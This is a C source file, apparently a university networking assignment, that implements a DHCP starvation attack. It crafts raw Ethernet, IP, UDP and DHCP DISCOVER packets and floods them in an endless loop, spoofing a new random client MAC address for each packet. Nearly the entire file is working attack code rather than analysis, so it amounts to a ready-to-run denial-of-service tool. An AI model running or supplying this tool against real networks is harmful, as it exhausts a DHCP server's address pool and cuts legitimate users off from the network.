/*
*  File: ipk-dhcpstarve.c
*  IPK 2018 - 2.Projekt - DHCP Starvation attack
*  Autor: Matus Liscinsky
*  Login: xlisci02
*  Mail: xlisci02@stud.fit.vutbr.cz
*  Datum: 9.4.2018
*/

#include "ipk-dhcpstarve.h"

int get_interface_index( struct ifreq * if_idx, int socket, char * interface ){

	memset(&(*if_idx), 0, sizeof(struct ifreq));
	strncpy(if_idx->ifr_name, interface, IFNAMSIZ-1);
	if (ioctl(socket, SIOCGIFINDEX, &(*if_idx)) < 0){
		fprintf(stderr, "ERR: ioctl \n");
		return ERR;
	}
	return SUCCESS;
}

void generate_mac_addr( unsigned char * mac ){
		
	for(int i = 0; i < ETHERNET_HARDWARE_ADDRESS_LENGTH * 2; i++){
		int number = rand()%256;
		mac[i] = number; 	
	}

}

int get_interface_address( struct ifreq * if_mac, int socket, char * interface ){

	memset(&(*if_mac), 0, sizeof(struct ifreq));
	strncpy(if_mac->ifr_name, interface , IFNAMSIZ-1);
	if (ioctl(socket, SIOCGIFHWADDR, &(*if_mac)) < 0){
		fprintf(stderr, "ERR: ioctl \n");
		return ERR;
	}
	return SUCCESS;
}

void generate_ethernet_header( struct ifreq * if_mac, int * pack_len, char * sendbuf ){
	
	/* ukazuje na zaciatok bufferu, eth hlavicka je umiestnena ako prva */
	struct ether_header * eh = (struct ether_header *) sendbuf; 
	memset(sendbuf, 0, 1024);
	
	/* vyplneni source a destination adries v eth hlavicke */
	for (int i = 0; i < ETHERNET_HARDWARE_ADDRESS_LENGTH; i++){
		eh->ether_shost[i] = ((uint8_t *)&(*if_mac).ifr_hwaddr.sa_data)[i];
		eh->ether_dhost[i] = BROADCAST_MAC;
	}

	/* typ protokolu a velkost zapsanych dat do bufferu */
	eh->ether_type = htons(ETH_P_IP);
	*pack_len += sizeof(struct ether_header);
}

struct iphdr * generate_ip_header( int * pack_len, char * sendbuf ){
	
	/* ukazuje za ethernet hlavicku v bufferi */
	struct iphdr * iph = (struct iphdr *) (sendbuf + sizeof(struct ether_header));

	/* nastavenie parametrov ip hlavicky */ 
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 16; 
	iph->id = htons(54321);
	iph->ttl = 128; 
	iph->protocol = 17; 

	/* Source IP addresa */
	iph->saddr = inet_addr("0.0.0.0");
	/* Destination IP adresa (BROADCAST) */
	iph->daddr = inet_addr("255.255.255.255");
	
	/* Nova velkost uz zapisanych dat do bufferu, vacsia o velkost ip hlavicky */
	*pack_len += sizeof(struct iphdr);
	return iph;
}

struct udphdr * generate_udp_header ( int * pack_len, char * sendbuf ){

	/* ukazuje za ethernet a ip hlavicku v bufferi */
	struct udphdr * udph = (struct udphdr *) (sendbuf + sizeof(struct iphdr) + sizeof(struct ether_header));
	
	/* nastavenie source a destination adresy v UDP hlavicke */
	udph->source = htons(68);
	udph->dest = htons(67);
	udph->check = 0; 

	/* Nova velkost uz zapisanych dat do bufferu, vacsia o velkost udp hlavicky */
	*pack_len += sizeof(struct udphdr);
	return udph;
}


unsigned short csum( unsigned short *buf, int nwords ){
    unsigned long sum;
    for(sum=0; nwords>0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}


void complete_headers( int * pack_len, struct udphdr * udph, struct iphdr * iph, char * sendbuf ){

	/* Velkost dat zapisanych v UDP casti */
	udph->len = htons(*pack_len - sizeof(struct ether_header) - sizeof(struct iphdr));
	/* Velkost dat zapisanych v IP casti */
	iph->tot_len = htons(*pack_len - sizeof(struct ether_header));
	/* Vypocet checksum a zapis do IP hlavicky */
	iph->check = csum((unsigned short *)(sendbuf + sizeof(struct ether_header)), sizeof(struct iphdr)/2);
}
	
int send_dhcp_packet( int socket, struct ifreq * if_idx , int pack_len, char * sendbuf ){

	/* Socket pre destination adresu */
	struct sockaddr_ll socket_address;
	
	/* Index rozhrania, na ktore sa posiela packet */
	socket_address.sll_ifindex = if_idx->ifr_ifindex;
	
	/* Dlzka adresy - Pocet oktetov v ethernet adrese (6) */
	socket_address.sll_halen = ETH_ALEN;
	
	/* Destination MAC adresa (BROADCAST) */
	for (int i = 0; i < ETHERNET_HARDWARE_ADDRESS_LENGTH; i++)
		socket_address.sll_addr[i] = BROADCAST_MAC;
	
	/* Posielanie packetu */
	if(sendto(socket, sendbuf, pack_len, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0){
		fprintf(stderr, "Send failed %d\n", socket);
		return ERR;
	}
	return SUCCESS;
}

dhcp_packet * fill_dhcp_discover( int * pack_len, char * sendbuf ){
	dhcp_packet * discover_packet = (dhcp_packet * ) (sendbuf + sizeof(struct iphdr) + sizeof(struct ether_header) + sizeof(struct udphdr));

	/* vynuluje strukturu */
	memset(&(*discover_packet), 0, sizeof(dhcp_packet));
	
	/* nastavenie opcode, ten specifikuje vseobecny typ spravy (REQUEST) */
	discover_packet->op = BOOTREQUEST;

	/* nastavenie hardware typu, specifikuje pouzivany typ HW pre siet  */
	discover_packet->htype = ETHERNET_HARDWARE_ADDRESS_TYPE;

	/* dlzka ethernet adresy */
	discover_packet->hlen = ETHERNET_HARDWARE_ADDRESS_LENGTH;

	/* transaction id, nahodne generovane*/
	discover_packet->xid = htonl(rand());

	/* flags, nastavenie prveho bitu (BC) */ 
	discover_packet->flags = htons(BROADCAST_FLAG);

	memset(&discover_packet->ciaddr, 0, sizeof(struct in_addr));
	memset(&discover_packet->yiaddr, 0, sizeof(struct in_addr));
	memset(&discover_packet->siaddr, 0, sizeof(struct in_addr));
	memset(&discover_packet->giaddr, 0, sizeof(struct in_addr));
	
	/* pole OPTIONS */ 
	/* prve styri byty je tzv. magic cookie */ 
	discover_packet->options[0] = 99;
	discover_packet->options[1] = 130;
	discover_packet->options[2] = 83;
	discover_packet->options[3] = 99;

	/* informacie o tom ze ide o DHCP DISCOVER */
	discover_packet->options[4] = MESSAGE_TYPE;    
	discover_packet->options[5] = sizeof(uint8_t); // velkost informacie o type spravy v bytoch 
	discover_packet->options[6] = DHCP_DISCOVER;
	
	/* end mark */
	discover_packet->options[7]= 0xFF;
	
	/* Velkost zapisanych dat do bufferu sa zvacsi o velkost vlozenej struktury */
	*pack_len += sizeof(dhcp_packet);
	return discover_packet;
}

int main(int argc, char * argv[]){
	
	if(argc != 3 || (strcmp("-i",argv[1])) ){
		fprintf(stderr, "ERR: Bad arguments \n");
		return ERR;
	}
	char * interface = argv[2];
	int sockfd;
	struct ifreq if_idx;
	struct ifreq if_mac;
	int pack_len = 0;
	char sendbuf[BUFSIZE];
	struct iphdr *iph;
	struct udphdr *udph;
	dhcp_packet * dhcp;
	
	if ((sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW)) < 0) {
		fprintf(stderr, "ERR: Creating socket unsuccesful \n");
	}

	if ( get_interface_index( &if_idx, sockfd, interface ) < 0 )
		fprintf(stderr, "ERR: Bad interface \n");

	if ( get_interface_address( &if_mac, sockfd, interface ) < 0 )
		fprintf(stderr, "ERR: Bad interface \n");


	generate_ethernet_header( &if_mac, &pack_len, sendbuf );

	iph = generate_ip_header( &pack_len, sendbuf );

	udph = generate_udp_header ( &pack_len, sendbuf );
	
	
	dhcp = fill_dhcp_discover( &pack_len, sendbuf );

	complete_headers( &pack_len, udph, iph, sendbuf );
	unsigned char mac [13] = {'\0'};	

	while (1){
	generate_mac_addr( mac );
	memcpy(dhcp->chaddr, mac , 13);
		
		if(	send_dhcp_packet( sockfd, &if_idx , pack_len, sendbuf ) < 0){
			fprintf(stderr, "ERR: Sending Discover meessage unsuccesful \n");
			close(sockfd);
			return ERR;
		}
	}
	close(sockfd);
	return SUCCESS;
}
